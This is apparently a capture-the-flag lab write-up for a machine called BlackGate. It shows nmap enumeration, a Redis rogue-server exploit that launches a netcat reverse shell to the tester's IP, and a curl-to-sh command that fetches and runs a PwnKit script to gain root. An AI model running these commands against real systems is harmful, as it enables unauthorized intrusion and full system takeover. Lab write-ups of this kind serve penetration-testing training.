##### Tags: `redis`  `CVE-2021-4034`  `searchsploit`  `github` 

# 🐧BlackGate🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.176
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 20:38 AEDT
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 6379 is running Redis 4.0.14      
search on github and found the script   
redis-master.py   
https://github.com/vulhub/redis-rogue-getshell?tab=readme-ov-file     
exp.so   
https://github.com/n0b0dyCN/redis-rogue-server     

Then run the script with revershell command
```
$ python3 redis-master.py -r 192.168.156.176 -L 192.168.45.231 -f exp.so -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.231 9001 >/tmp/f"

$ nc -lvnp 9001  
listening on [any] 9001 ...
connect to [192.168.45.231] from (UNKNOWN) [192.168.156.176] 44158
$ whoami
prudence
```
run linpeas and found the machine is vulerable to [CVE-2021-4034] PwnKit
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```
## Privilege Escalation  
found the way to privilege escalation on github  
https://github.com/ly4k/PwnKit  
```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```
```
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"

root@blackgate:/home/prudence# whoami
whoami
root
```
